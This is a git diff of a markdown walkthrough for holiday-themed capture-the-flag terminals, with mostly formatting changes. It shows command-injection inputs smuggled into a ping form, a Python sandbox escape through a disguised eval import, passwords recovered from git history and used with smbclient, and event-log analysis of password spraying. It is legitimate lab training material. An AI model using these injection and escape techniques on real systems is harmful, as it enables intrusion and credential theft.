@@ -3,7 +3,7 @@
 * Exit vi (done):
 type `:q` and you're done.
 
-* Minty Candycane Employee onboard (WIP)
+# Minty Candycane Employee onboard (WIP)
 1. First enter your information, and you'll see how the information is saved in a SQLite DB.
 2. Use the "Test system" option and enter an IP. You'll notice it will ping.
 3. Try to inject commands, so I've entered `127.0.0.1; ls ; ` and I've got this output:
@@ -13,7 +13,7 @@ Enter address of server: 127.0.0.1 ; ls -lah ;
 PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
 64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.036 ms
 64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.043 ms
-64 bytes from 127.0.0.1: icmp_seq=3 ttl=64 time=0.043 ms
+64 bytes from 127.0.0.1: icmp_seq=3 ttl=64 time=0.043 msFtang
 
 --- 127.0.0.1 ping statistics ---
 3 packets transmitted, 3 received, 0% packet loss, time 2048ms
@@ -58,7 +58,8 @@ CREATE TABLE onboard (
 );
 sqlite> select * from onboard where fname like 'Chan' OR lname LIKE 'Chan';
 84|Scott|Chan|48 Colorado Way||Los Angeles|90067|4017533509|scottmchan90067@gmail.com
-sqlite>```
+sqlite>
+```
 
 5. The last step would be to run `runtoanswer`
 
@@ -68,11 +69,7 @@ Enter address of server: 1.1.1.1; runtoanswer
 connect: Network is unreachable
 Loading, please wait......
 
-
-
 Enter Mr. Chan's first name: Scott
-
-
 
     .;looooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooool:'
   'ooooooooooookOOooooxOOdodOOOOOOOdoxOOdoooooOOkoooooooxO000Okdooooooooooooo;
@@ -101,12 +98,11 @@ Enter Mr. Chan's first name: Scott
 Congratulations!
 
 onboard.db: SQLite 3.x database
-Press Enter to continue...: ```
+Press Enter to continue...:
+```
 
 
-
-
-* Curl expert
+# Curl expert
 1. It needs to be an HTTP2 request (so `CURL -X POST 127.0.0.1:8080 --http2`)
 > `listen                  8080 http2`
 
@@ -145,7 +141,8 @@ elf@657c12ef9fab:~$ curl -X POST 127.0.0.1:8080 -v --http2-prior-knowledge
 
 
  </body>
-</html>```
+</html>
+```
 
 4. The command to run would be:
 `curl -X POST 127.0.0.1:8080 -v --http2-prior-knowledge -d"status=on"`
@@ -158,7 +155,7 @@ elf@657c12ef9fab:~$ curl -X POST 127.0.0.1:8080 -v --http2-prior-knowledge
 ```
 
 
-* GDB Challenge
+# Shinny Upatree The sleighbell
 1. List, note you have gdb available.
 2. Ran gdb
 3. Listed functions with `objdump -t sleighbell-lotto | grep "F"`
@@ -170,15 +167,16 @@ elf@657c12ef9fab:~$ curl -X POST 127.0.0.1:8080 -v --http2-prior-knowledge
 
 
 
-* Tangle coalbox:
+# Tangle coalbox Lethal ForensicELFication:
 ```bash
  Tangle Coalbox, ER Investigator
   Find the first name of the elf of whom a love poem
   was written.  Complete this challenge by submitting
-  that name to runtoanswer.```
-1.Looking around I've noticed this folder: /home/elf/.secrets/her
-2. There's a text file which contains:
+  that name to runtoanswer.
+```
 
+1. Looking around I've noticed this folder: /home/elf/.secrets/her
+2. There's a text file which contains:
 
 ```bash
 elf@d9378db2c95b:~/.secrets/her$ cat poem.txt
@@ -220,9 +218,8 @@ Up and up climbed team and humor, Morcel being so adored,
 -Morcel Nougat
 ```
 
-3.Looking around I've noticed there is a `.viminfo` file, which contains:
+3. Looking around I've noticed there is a `.viminfo` file, which contains:
 ```bash
-
 
 # hlsearch on (H) or off (h):
 ~h
@@ -247,11 +244,10 @@ $NEVERMORE
 |2,0,1536606833,,"s/God/fates/gc"
 ```
 
-4.The name seems to be Elinore.
+4. The name seems to be Elinore.
 ```bash
 
 Who was the poem written about? Elinore
-
 
 WWNXXK00OOkkxddoolllcc::;;;,,,'''.............
 WWNXXK00OOkkxddoolllcc::;;;,,,'''.............
@@ -277,21 +273,19 @@ Thank you for giving this challenge your best.
 Congratulations!
 ```
 
-
-* Pepper Minstix webmail hack terminal
+# Pepper Minstix webmail hack terminal
 ```bash
   Submit the compromised webmail username to
-  runtoanswer to complete this challenge.```
+  runtoanswer to complete this challenge.
+```
 
   (WIP)
 
-* Python escape terminal
-1. Read
 
-
-* Coalbox Dev Ops Failure terminal
+# Coalbox Dev Ops Fail terminal
 1. Find Sparkle's password, then run the runtoanswer tool
-2.`git log` shows the following entry, among others:
+
+2. `git log` shows the following entry, among others:
 ```bash
 commit 60a2ffea7520ee980a5fc60177ff4d0633f2516b
 Author: Sparkle Redberry <sredberry@kringlecon.com>
@@ -299,9 +293,12 @@ Date:   Thu Nov 8 21:11:03 2018 -0500
 
     Per @tcoalbox admonishment, removed username/password from config.js, default settings in config.js.def need to be updated before use
 ```
-3.Go to `~/kcconfmgmt/server/config` to find `config.js.def`
-4.`git log config.js.def` shows only one entry, checking out the previous version should do the trick. So check out `b2376f4a93ca1889ba7d947c2d14be9a5d138802` and see.
-5.` git checkout b2376f4a93ca1889ba7d947c2d14be9a5d138802`
+3. Go to `~/kcconfmgmt/server/config` to find `config.js.def`
+
+4. `git log config.js.def` shows only one entry, checking out the previous version should do the trick. So check out `b2376f4a93ca1889ba7d947c2d14be9a5d138802` and see.
+
+5. `git checkout b2376f4a93ca1889ba7d947c2d14be9a5d138802`
+
 6. The file `server/config/config.js` contains:
 ```javascript
 // Database URL
@@ -309,8 +306,11 @@ module.exports = {
     'url' : 'mongodb://sredberry:twinkletwinkletwinkle@127.0.0.1:27017/node-api'
 };
 ```
-7.`./runtoanswer`, enter `twinkletwinkletwinkle`
-8.Read the nice poem:
+
+7. `./runtoanswer`, enter `twinkletwinkletwinkle`
+
+8. Read the nice poem:
+
 ```bash
 This ain't "I told you so" time, but it's true:
 I shake my head at the goofs we go through.
@@ -340,12 +340,12 @@ elf         42  0.0  0.0  36636  2740 pts/0    R+   20:38   0:00 ps aux
 elf         43  0.0  0.0   6420   916 pts/0    S+   20:38   0:00 more
 ```
 
-2.Tried logged in as user `report-upload`:
+2. Tried logged in as user `report-upload`:
 `smbclient -U report-upload //localhost/report-upload/`
 
-3.When asked for a password, entered `directreindeerflatterystable`
+3. When asked for a password, entered `directreindeerflatterystable`
 
-4.Got access to Samba share. Then run `put report.txt report.txt`. Seemed to work:
+4. Got access to Samba share. Then run `put report.txt report.txt`. Seemed to work:
 ```bash
 smb: \> put report.txt report.txt
 putting file report.txt as \report.txt (250.5 kb/s) (average 250.5 kb/s)
@@ -384,7 +384,7 @@ Building separate accounts for each elf in the lot.
 ```
 
 
-# Exit Python terminal
+# Python Escape from LA terminal
 
 ```bash
 >>> os = eval('__im'+'port__("os")')
@@ -437,7 +437,7 @@ You escaped! Congratulations!
 ```
 
 # Yule Log Analysis
-1.`ls` to find out the files in the current dir; then `python evtx_dump.py ho-ho-no.evtx > log.xml`
+1. `ls` to find out the files in the current dir; then `python evtx_dump.py ho-ho-no.evtx > log.xml`
 2. See the different events: `cat log.xml | grep EventID | sort | uniq -c | sort -rn` :
 ```bash
 elf@64476099810b:~$ cat log.xml | grep EventID | sort | uniq -c | sort -rn
@@ -480,6 +480,7 @@ elf@64476099810b:~$ cat log.xml | grep EventID | sort | uniq -c | sort -rn
 5059: Key migration operation
 
 3. The events `4738`, `4724` seem to be interesting, an account was changed and a password change attempts was issued. What does this event say?
+
 4. The events `4624` and `4625` are interesting too. Run this command to see what happened with some events:
 ```bash
 grep -E "4625|4624" log.xml -A 20 | grep -E "EventID|TargetUserName"  | grep -v HealthMailbox | grep -E "462|Data"
@@ -487,6 +488,7 @@ grep -E "4625|4624" log.xml -A 20 | grep -E "EventID|TargetUserName"  | grep -v 
 
 5. So I'll look for many `4625` followed by a `4624`; which points to:
 `<Data Name="TargetUserName">minty.candycane</Data>`
+
 6. Try `minty.candycane` as an answer:
 
 ```bash
@@ -496,8 +498,3 @@ Passwords formed with season-year are on the hackers' list.
 Maybe we should look at guidance published by the NIST?
 Congratulations!
 ```
-
-
-# HoHoHo Daddy TODO
-
-# Elf Terminal (Alabaster Snowball) TODO
